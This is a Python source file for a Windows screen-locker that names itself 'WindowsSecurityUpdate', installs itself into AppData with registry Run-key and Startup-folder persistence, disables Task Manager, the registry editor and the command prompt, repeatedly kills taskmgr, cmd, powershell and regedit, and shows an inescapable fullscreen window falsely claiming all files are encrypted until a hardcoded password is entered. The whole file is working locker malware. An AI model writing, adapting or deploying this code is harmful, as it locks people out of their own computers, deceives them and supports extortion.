import tkinter as tk
from tkinter import messagebox
import os
import sys
import ctypes
import winreg
import subprocess
import hashlib
import threading
import time
import shutil

# ============================================
# CONFIGURATION
# ============================================
PASSWORD_HASH = hashlib.sha256("khanhdev297".encode()).hexdigest()
APP_NAME = "WindowsSecurityUpdate"
PERSISTENCE_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
INSTALL_PATH = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Security")
SCRIPT_NAME = "security_update.pyw"
FAILED_ATTEMPTS_FILE = os.path.join(INSTALL_PATH, ".attempts")

# ============================================
# SYSTEM LOCKDOWN FUNCTIONS
# ============================================
def disable_task_manager():
    """Block Task Manager via registry"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        # Alternative: kill taskmgr.exe on detection
        pass

def disable_registry_editor():
    """Block regedit access"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

def disable_command_prompt():
    """Block cmd.exe"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Policies\Microsoft\Windows\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(key)
    except:
        pass

def kill_task_manager_thread():
    """Continuously kill taskmgr.exe if opened"""
    while True:
        try:
            subprocess.run(["taskkill", "/F", "/IM", "taskmgr.exe"], 
                          capture_output=True, shell=True)
            subprocess.run(["taskkill", "/F", "/IM", "cmd.exe"], 
                          capture_output=True, shell=True)
            subprocess.run(["taskkill", "/F", "/IM", "powershell.exe"], 
                          capture_output=True, shell=True)
            subprocess.run(["taskkill", "/F", "/IM", "regedit.exe"], 
                          capture_output=True, shell=True)
        except:
            pass
        time.sleep(0.5)

def disable_all_hotkeys():
    """Block common Windows hotkeys via keyboard hooks"""
    # Alt+F4, Ctrl+Alt+Del are handled by fullscreen overlay
    # Win key, Alt+Tab blocked by fullscreen always-on-top
    pass

def setup_persistence():
    """Install to startup for survival after reboot"""
    if not os.path.exists(INSTALL_PATH):
        os.makedirs(INSTALL_PATH, exist_ok=True)
    
    # Copy self to persistent location
    target_path = os.path.join(INSTALL_PATH, SCRIPT_NAME)
    if getattr(sys, 'frozen', False):
        current_exe = sys.executable
        shutil.copy2(current_exe, target_path)
    else:
        shutil.copy2(__file__, target_path)
    
    # Add to registry Run key
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, f'pythonw "{target_path}"')
        winreg.CloseKey(key)
    except:
        pass
    
    # Also add to Startup folder
    startup_folder = os.path.join(os.environ["APPDATA"], 
                                  "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shortcut_path = os.path.join(startup_folder, f"{APP_NAME}.bat")
    with open(shortcut_path, "w") as f:
        f.write(f'@echo off\npythonw "{target_path}"')

def restore_system():
    """Undo all lockdown changes"""
    # Restore Task Manager
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass
    
    # Restore Registry Editor
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except:
        pass
    
    # Restore Command Prompt
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Policies\Microsoft\Windows\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableCMD")
        winreg.CloseKey(key)
    except:
        pass
    
    # Remove persistence
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSISTENCE_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
    except:
        pass
    
    # Remove startup shortcut
    startup_folder = os.path.join(os.environ["APPDATA"],
                                  "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shortcut_path = os.path.join(startup_folder, f"{APP_NAME}.bat")
    if os.path.exists(shortcut_path):
        os.remove(shortcut_path)
    
    # Remove attempts file
    if os.path.exists(FAILED_ATTEMPTS_FILE):
        os.remove(FAILED_ATTEMPTS_FILE)

def self_destruct():
    """Delete all traces of this program"""
    restore_system()
    
    # Schedule deletion via batch script
    bat_path = os.path.join(os.environ["TEMP"], "cleanup.bat")
    target_path = os.path.join(INSTALL_PATH, SCRIPT_NAME)
    
    with open(bat_path, "w") as f:
        f.write(f'''@echo off
timeout /t 2 /nobreak >nul
del /F /Q "{target_path}"
rmdir /S /Q "{INSTALL_PATH}"
del /F /Q "{bat_path}"
''')
    
    subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

# ============================================
# GUI LOCKSCREEN
# ============================================
class ScreenLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("SYSTEM LOCKED")
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(bg='black')
        self.root.protocol("WM_DELETE_WINDOW", self.block_close)
        
        # Block Alt+F4
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Alt-Tab>', lambda e: 'break')
        self.root.bind('<Control-Alt-Delete>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        self.root.bind('<Win_L>', lambda e: 'break')
        self.root.bind('<Win_R>', lambda e: 'break')
        
        # Override cursor to keep it visible but trapped
        self.root.config(cursor="none")
        
        # Failed attempts counter
        self.failed_attempts = 0
        if os.path.exists(FAILED_ATTEMPTS_FILE):
            try:
                with open(FAILED_ATTEMPTS_FILE, "r") as f:
                    self.failed_attempts = int(f.read().strip())
            except:
                self.failed_attempts = 0
        
        self.build_ui()
    
    def block_close(self):
        """Prevent window from being closed"""
        pass
    
    def build_ui(self):
        """Create the lockscreen terminal interface"""
        # Main frame - emulates terminal look
        main_frame = tk.Frame(self.root, bg='#0C0C0C')
        main_frame.pack(fill='both', expand=True)
        
        # Terminal content area
        terminal_frame = tk.Frame(main_frame, bg='#0C0C0C')
        terminal_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # ASCII art warning
        ascii_art = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██╗    ██╗ █████╗ ██████╗ ███╗   ██╗██╗███╗   ██╗ ██████╗  ║
║   ██║    ██║██╔══██╗██╔══██╗████╗  ██║██║████╗  ██║██╔════╝  ║
║   ██║ █╗ ██║███████║██████╔╝██╔██╗ ██║██║██╔██╗ ██║██║  ███╗ ║
║   ██║███╗██║██╔══██║██╔══██╗██║╚██╗██║██║██║╚██╗██║██║   ██║ ║
║   ╚███╔███╔╝██║  ██║██║  ██║██║ ╚████║██║██║ ╚████║╚██████╔╝ ║
║    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ║
║                                                              ║
║              YOUR SYSTEM HAS BEEN LOCKED                     ║
║                                                              ║
║   All files have been encrypted. To restore access,          ║
║   you must enter the correct unlock password.                ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
        self.terminal_display = tk.Text(
            terminal_frame,
            bg='#0C0C0C',
            fg='#FF0000',
            font=('Consolas', 11),
            width=70,
            height=18,
            bd=0,
            highlightthickness=0,
            relief='flat'
        )
        self.terminal_display.insert('1.0', ascii_art)
        self.terminal_display.config(state='disabled')
        self.terminal_display.pack(pady=(0, 10))
        
        # Input area
        input_frame = tk.Frame(terminal_frame, bg='#0C0C0C')
        input_frame.pack()
        
        self.prompt_label = tk.Label(
            input_frame,
            text="PASSWORD: ",
            bg='#0C0C0C',
            fg='#00FF00',
            font=('Consolas', 14, 'bold')
        )
        self.prompt_label.pack(side='left')
        
        self.password_entry = tk.Entry(
            input_frame,
            bg='#1A1A1A',
            fg='#00FF00',
            font=('Consolas', 14, 'bold'),
            width=30,
            insertbackground='#00FF00',
            relief='solid',
            bd=1,
            show='*'
        )
        self.password_entry.pack(side='left', padx=(5, 10))
        self.password_entry.bind('<Return>', self.check_password)
        self.password_entry.focus_set()
        
        # Status message
        self.status_label = tk.Label(
            terminal_frame,
            text=f"[FAILED ATTEMPTS: {self.failed_attempts}]",
            bg='#0C0C0C',
            fg='#FF5555',
            font=('Consolas', 11)
        )
        self.status_label.pack(pady=(10, 0))
        
        # Re-focus entry if user clicks anywhere
        self.root.bind('<Button-1>', lambda e: self.password_entry.focus_set())
        self.root.bind('<Key>', lambda e: self.password_entry.focus_set())
    
    def check_password(self, event=None):
        """Verify entered password"""
        entered = self.password_entry.get()
        entered_hash = hashlib.sha256(entered.encode()).hexdigest()
        
        if entered_hash == PASSWORD_HASH:
            self.unlock_system()
        else:
            self.failed_attempts += 1
            # Save failed attempts
            with open(FAILED_ATTEMPTS_FILE, "w") as f:
                f.write(str(self.failed_attempts))
            
            self.status_label.config(
                text=f"[ACCESS DENIED - FAILED ATTEMPTS: {self.failed_attempts}]",
                fg='#FF0000'
            )
            self.password_entry.delete(0, 'end')
            # Flash screen red briefly
            self.root.configure(bg='#330000')
            self.root.after(200, lambda: self.root.configure(bg='black'))
    
    def unlock_system(self):
        """Unlock and self-destruct"""
        self.root.destroy()
        self_destruct()
        sys.exit(0)
    
    def run(self):
        """Start the lockscreen"""
        # Disable system shortcuts
        disable_task_manager()
        disable_registry_editor()
        disable_command_prompt()
        
        # Start task killer thread
        killer_thread = threading.Thread(target=kill_task_manager_thread, daemon=True)
        killer_thread.start()
        
        # Ensure window stays on top
        self.root.after(100, self.keep_on_top)
        self.root.mainloop()
    
    def keep_on_top(self):
        """Continuously enforce topmost and fullscreen"""
        self.root.attributes('-topmost', True)
        self.root.attributes('-fullscreen', True)
        self.root.focus_force()
        self.password_entry.focus_set()
        self.root.after(500, self.keep_on_top)

# ============================================
# MAIN ENTRY POINT
# ============================================
if __name__ == "__main__":
    # Check if this is first run or reboot persistence
    if not os.path.exists(INSTALL_PATH):
        setup_persistence()
    
    # Initialize failed attempts counter if needed
    if not os.path.exists(FAILED_ATTEMPTS_FILE):
        with open(FAILED_ATTEMPTS_FILE, "w") as f:
            f.write("0")
    
    # Launch lockscreen
    locker = ScreenLocker()
    locker.run()